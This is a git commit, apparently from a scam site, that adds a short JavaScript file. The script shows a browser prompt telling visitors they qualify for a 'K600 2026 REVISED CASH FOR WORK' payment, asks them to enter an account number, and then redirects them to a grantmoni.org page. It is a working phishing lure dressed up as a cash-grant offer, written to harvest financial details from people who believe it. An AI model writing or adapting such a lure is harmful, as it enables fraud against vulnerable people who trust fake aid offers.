2cd05439aa81884f03cfb4d2f6bf2a02d6e6fa45
grntmoni <casket-90-crystal@icloud.com>
2026-05-12 09:01:06 +0100

    Create zc4wactive.js

---
+++ zc4wactive.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW K600'
+password=prompt('Congratulations, you are eligible to APPLY for K600 2026 REVISED CASH FOR WORK (R-CFW), click OK to Enter Your Acc. Number','WITHDRAW K600');
+if (password != 'WITHDRAW K600') {
+location.href='https://grantmoni.org/Revised-Cash-Work.html';
+}
